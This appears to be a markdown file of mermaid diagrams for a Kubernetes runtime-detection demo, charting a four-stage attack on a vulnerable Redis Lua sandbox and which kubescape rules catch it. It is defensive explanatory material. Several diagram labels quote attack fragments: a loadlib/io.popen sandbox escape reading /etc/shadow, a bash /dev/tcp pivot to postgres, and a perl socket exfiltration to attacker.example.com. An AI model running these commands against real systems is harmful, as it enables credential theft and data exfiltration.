# Chain demo — mermaid variants

Ten diagrams showing different aspects of the chain demo. Style mirrors
the fusioncore-web sbob spec (theme `base` + the 5 semantic classDef
classes `ref` / `live` / `cmp` / `warn` / `ok` with slate link
defaults). Each variant is independent — pick whichever telling fits
the audience.

The shared palette:

```text
ref   gold       #C3A50D  reference / expected / signed
live  black      #0a0a0a  live / runtime
cmp   cream      #fff5d6  comparison / decision / data flow
warn  red        #D43F5B  attack / breach / failure
ok    off-white  #fafaf6  pass / detected / safe
```

---

## 1 · Topology — what's deployed in the `chain` namespace

The four pods and the legitimate service edges. Use this when introducing
the demo to someone who hasn't seen it before.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart LR
  classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
  classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
  classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px

  user(["<b>user / k6</b><br/><i>HTTP client</i>"]):::ok
  fe["<b>chain-frontend</b><br/>Go (distroless) :8080<br/><i>/ · /api/products · /api/cache/eval</i>"]:::live
  be["<b>chain-backend</b><br/>Go (distroless) :8080<br/><i>/api/products → postgres</i>"]:::live
  rd["<b>chain-redis</b><br/>ghcr.io/k8sstormcenter/<br/>redis-vulnerable:7.2.10<br/>:6379"]:::ref
  pg["<b>chain-postgres</b><br/>postgres:16<br/>:5432"]:::ref

  user -->|HTTP| fe
  fe -->|HTTP| be
  fe -->|RESP EVAL| rd
  be -->|pg-wire| pg

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 2 · Benign-traffic flow — what kubescape learns into the sbobs

The traffic generator's two patterns during the learning window. This
is what defines the legitimate baseline that the chain attack later
silently piggybacks on.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart LR
  classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
  classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
  classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px

  curl(["<b>curlimages/curl</b><br/><i>30× during learning</i>"]):::ok
  fe["<b>chain-frontend</b>"]:::live
  be["<b>chain-backend</b>"]:::live
  rd["<b>chain-redis</b>"]:::ref
  pg["<b>chain-postgres</b>"]:::ref

  curl ==>|"GET /api/products (15×)"| fe
  curl ==>|"POST /api/cache/eval (15×)<br/><i>INCR counter — atomic</i>"| fe
  fe -->|HTTP| be
  fe -->|EVAL ok-script| rd
  be -->|SELECT products| pg

  cap[["<b>kubescape node-agent</b><br/><i>BPF tracers seal AP+NN<br/>after maxLearningPeriod 2m</i>"]]:::cmp
  rd -.->|"learned exec:<br/>/usr/local/bin/redis-server"| cap
  fe -.->|"learned egress:<br/>kube-dns, backend, redis"| cap

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 3 · The attack chain — one POST per stage, all to the eval endpoint

Single attacker, four sequential HTTP POSTs into the SAME legitimate
endpoint. The variant is the Lua **payload**, not the entry vector.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart TB
  classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
  classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
  classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px

  atk(["<b>attacker</b><br/><i>4 × POST /api/cache/eval</i>"]):::warn

  s1["<b>s1 · recon</b><br/><i>script: INCR counter</i><br/>blind by design"]:::cmp
  s2["<b>s2 · escape + shadow</b><br/><i>loadlib → io.popen('cat /etc/shadow')</i>"]:::warn
  s3["<b>s3 · pivot</b><br/><i>io.popen('bash -c &quot;exec 3&lt;&gt;/dev/tcp/chain-postgres/5432&quot;')</i>"]:::warn
  s4["<b>s4 · exfil</b><br/><i>io.popen('perl IO::Socket → attacker.example.com')</i>"]:::warn

  fe["<b>chain-frontend</b><br/><i>RESP proxy to redis</i>"]:::live
  rd["<b>chain-redis</b><br/><i>vulnerable Lua sandbox</i>"]:::ref

  atk --> s1 --> fe
  atk --> s2 --> fe
  atk --> s3 --> fe
  atk --> s4 --> fe
  fe ==>|EVAL| rd

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 4 · Where each detection fires (or doesn't)

Same 4 stages, but the focus is now WHICH RULE on WHICH POD. Green = fires,
red = silent.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart LR
  classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
  classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
  classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px

  subgraph Stages [" "]
    direction TB
    s1["<b>s1 recon</b>"]:::cmp
    s2["<b>s2 escape + shadow</b>"]:::warn
    s3["<b>s3 pivot</b>"]:::warn
    s4["<b>s4 exfil</b>"]:::warn
  end

  subgraph Detections [" detections on chain-redis "]
    direction TB
    r0001a(["<b>R0001 cat</b><br/>unexpected process"]):::ok
    r0010(["<b>R0010 /etc/shadow</b><br/>sensitive file"]):::ok
    r0001b(["<b>R0001 bash</b><br/>unexpected process"]):::ok
    r0011a(["<b>R0011 → postgres</b><br/>unexpected egress"]):::warn
    r0001c(["<b>R0001 perl</b><br/>unexpected process"]):::ok
    r0005(["<b>R0005 attacker.example.com</b><br/>DNS anomaly"]):::warn
    r0011b(["<b>R0011 external:80</b><br/>unexpected egress"]):::warn
  end

  s2 ==>|fires| r0001a
  s2 ==>|fires| r0010
  s3 ==>|fires| r0001b
  s3 -.->|silent| r0011a
  s4 ==>|fires| r0001c
  s4 -.->|silent| r0005
  s4 -.->|silent| r0011b

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 5 · The blind-spot map — what two cluster knobs would unblind

Each red detection traces back to one of two operator settings. Flip
both → demo goes from 4/7 to 7/7.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart TB
  classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
  classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px

  k1[["<b>knob 1</b><br/>values.yaml<br/><i>networkEventsStreaming: <b>disable</b></i>"]]:::warn
  k2[["<b>knob 2</b><br/>default-rules.yaml<br/><i>R0011.isTriggerAlert: <b>false</b></i>"]]:::warn

  b1(["R0005 DNS — s4"]):::warn
  b2(["R0011 egress — s3"]):::warn
  b3(["R0011 egress — s4"]):::warn

  d1(["R0001 cat — s2"]):::ok
  d2(["R0010 /etc/shadow — s2"]):::ok
  d3(["R0001 bash — s3"]):::ok
  d4(["R0001 perl — s4"]):::ok

  k1 -->|suppresses| b1
  k1 -->|suppresses| b2
  k1 -->|suppresses| b3
  k2 -->|suppresses| b2
  k2 -->|suppresses| b3

  d1 ~~~ d2 ~~~ d3 ~~~ d4

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 6 · Sbob contents per pod — why redis is the perfect catch surface

The narrow learned profile on chain-redis (one exec, zero egress) is
the precondition that makes 4 of 7 detections trigger reliably.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart LR
  classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
  classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
  classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px

  subgraph FE [" chain-frontend "]
    fe_ap["<b>AP.execs</b><br/>/chain-frontend"]:::cmp
    fe_nn["<b>NN.egress</b><br/>kube-dns:53<br/>backend:8080<br/>redis:6379"]:::ok
  end

  subgraph BE [" chain-backend "]
    be_ap["<b>AP.execs</b><br/>/chain-backend"]:::cmp
    be_nn["<b>NN.egress</b><br/>kube-dns:53<br/>postgres:5432"]:::ok
  end

  subgraph RD [" chain-redis <br/><i>(the blast surface)</i> "]
    rd_ap["<b>AP.execs</b><br/>redis-server <i>only</i>"]:::ref
    rd_nn["<b>NN.egress</b><br/><i>EMPTY</i>"]:::ref
  end

  subgraph PG [" chain-postgres "]
    pg_ap["<b>AP.execs</b><br/>17 binaries<br/>postgres, psql, sh, bash,<br/>cat, find, …"]:::cmp
    pg_nn["<b>NN.egress</b><br/><i>EMPTY</i>"]:::ok
  end

  rd -.->|"every spawn<br/>= unexpected"| rd
  rd -.->|"every outbound<br/>= unexpected"| rd

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 7 · Inside the sandbox escape — what the Lua actually does

Zoom into stage 2's payload. Each step is a real Lua + libc call,
mapping to a syscall the BPF tracer can observe.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart TB
  classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
  classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
  classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px

  in["POST /api/cache/eval<br/><i>{script: &quot;...&quot;}</i>"]:::cmp
  fe_proxy["<b>frontend</b><br/>RESP encode<br/>EVAL &lt;script&gt; 0"]:::live
  rd_eval["<b>redis EVAL</b><br/>Lua sandbox"]:::live

  esc1["<b>pcall</b><br/>io != nil ?"]:::cmp
  esc2["<b>package.loadlib</b><br/>/usr/lib/liblua5.1.so.0<br/>'luaopen_io'"]:::warn
  esc3["<b>io.popen</b>(&quot;cat /etc/shadow&quot;)"]:::warn

  fork["fork() + execve()<br/><i>/bin/sh -c &quot;cat …&quot;</i>"]:::warn
  cat_open["open(/etc/shadow, O_RDONLY)<br/><i>comm=cat</i>"]:::warn

  bpf[["<b>node-agent BPF</b><br/><i>execve hook + open hook</i>"]]:::ok
  r0001(["<b>R0001 fires</b><br/>comm=cat ∉ AP"]):::ok
  r0010(["<b>R0010 fires</b><br/>/etc/shadow ∈ sensitive list"]):::ok

  in --> fe_proxy --> rd_eval --> esc1 --> esc2 --> esc3
  esc3 --> fork --> cat_open
  fork -.->|exec event| bpf
  cat_open -.->|open event| bpf
  bpf --> r0001
  bpf --> r0010

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 8 · MITRE ATT&CK mapping — kill chain across the 4 stages

Same chain, told in TTP language. Each stage maps to one or two MITRE
techniques and a defensive control.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart LR
  classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
  classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px

  s1["<b>s1 · Reconnaissance</b><br/><i>T1595 active scan</i>"]:::cmp
  s2["<b>s2 · Initial Access + Discovery</b><br/><i>T1190 exploit public-facing app<br/>T1083 file & dir discovery</i>"]:::warn
  s3["<b>s3 · Lateral Movement</b><br/><i>T1210 exploit remote service<br/>T1071.001 web protocols</i>"]:::warn
  s4["<b>s4 · Exfiltration</b><br/><i>T1041 exfil over C2<br/>T1571 non-standard port</i>"]:::warn

  d2["<b>R0001 / R0010</b><br/>process + file rules<br/><i>caught</i>"]:::ok
  d3["<b>R0001</b> caught<br/><b>R0011</b> <i>blind</i>"]:::cmp
  d4["<b>R0001</b> caught<br/><b>R0005 / R0011</b> <i>blind</i>"]:::cmp

  s1 --> s2 --> s3 --> s4
  s2 -.->|defender| d2
  s3 -.->|defender| d3
  s4 -.->|defender| d4

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 9 · Coverage matrix — scenarios × rules

Compact grid view of which expected detection landed where. Same data
as the coverage table the script prints; visual form for slide decks.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart TB
  classDef warn fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
  classDef ok   fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
  classDef cmp  fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px

  subgraph row_s2 [" s2 · escape + shadow "]
    direction LR
    s2_r0001["R0001 ✓"]:::ok
    s2_r0010["R0010 ✓"]:::ok
  end

  subgraph row_s3 [" s3 · pivot "]
    direction LR
    s3_r0001["R0001 ✓"]:::ok
    s3_r0011["R0011 ✗"]:::warn
  end

  subgraph row_s4 [" s4 · exfil "]
    direction LR
    s4_r0001["R0001 ✓"]:::ok
    s4_r0005["R0005 ✗"]:::warn
    s4_r0011["R0011 ✗"]:::warn
  end

  total[["<b>Coverage 4 / 7</b><br/><i>3 blind ⇒ 2 knobs</i>"]]:::cmp

  row_s2 ~~~ row_s3 ~~~ row_s4 ~~~ total

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## 10 · Knob-flip impact — same demo, two configurations

Side by side: today's defaults vs both knobs flipped. The argument for
paying for network-sbob is that the right column ALREADY exists in
code — it's just gated behind two operator settings.

```mermaid
%%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
flowchart LR
  classDef warn fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
  classDef ok   fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
  classDef cmp  fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
  classDef live fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px

  subgraph defaults [" defaults today "]
    direction TB
    a1["s2 R0001 cat ✓"]:::ok
    a2["s2 R0010 shadow ✓"]:::ok
    a3["s3 R0001 bash ✓"]:::ok
    a4["s3 R0011 egress ✗"]:::warn
    a5["s4 R0001 perl ✓"]:::ok
    a6["s4 R0005 DNS ✗"]:::warn
    a7["s4 R0011 egress ✗"]:::warn
    cov_a[["<b>4 / 7</b>"]]:::cmp
    a1 ~~~ a2 ~~~ a3 ~~~ a4 ~~~ a5 ~~~ a6 ~~~ a7 ~~~ cov_a
  end

  switch["⚙️ flip 2 knobs<br/><i>networkEventsStreaming: enable</i><br/><i>R0011.isTriggerAlert: true</i>"]:::live

  subgraph flipped [" knobs flipped "]
    direction TB
    b1["s2 R0001 cat ✓"]:::ok
    b2["s2 R0010 shadow ✓"]:::ok
    b3["s3 R0001 bash ✓"]:::ok
    b4["s3 R0011 egress ✓"]:::ok
    b5["s4 R0001 perl ✓"]:::ok
    b6["s4 R0005 DNS ✓"]:::ok
    b7["s4 R0011 egress ✓"]:::ok
    cov_b[["<b>7 / 7</b>"]]:::ok
    b1 ~~~ b2 ~~~ b3 ~~~ b4 ~~~ b5 ~~~ b6 ~~~ b7 ~~~ cov_b
  end

  defaults --> switch --> flipped

  linkStyle default stroke:#7a808c,stroke-width:1.2px
```

---

## How to render

These are GitHub-flavoured mermaid blocks — they render natively in
the README on GitHub or in any Hugo build with the
`render-codeblock-mermaid.html` partial that fusioncore-web ships. For
local PNG / SVG export:

```bash
npm i -g @mermaid-js/mermaid-cli
mmdc -i diagrams.md -o chain-diagrams.png --theme base --width 1600
```

For the fusioncore site, drop one of the blocks into a Hugo page; it
will inherit the same palette automatically (the `themeVariables`
header is redundant there but keeps the file portable to GitHub
rendering).
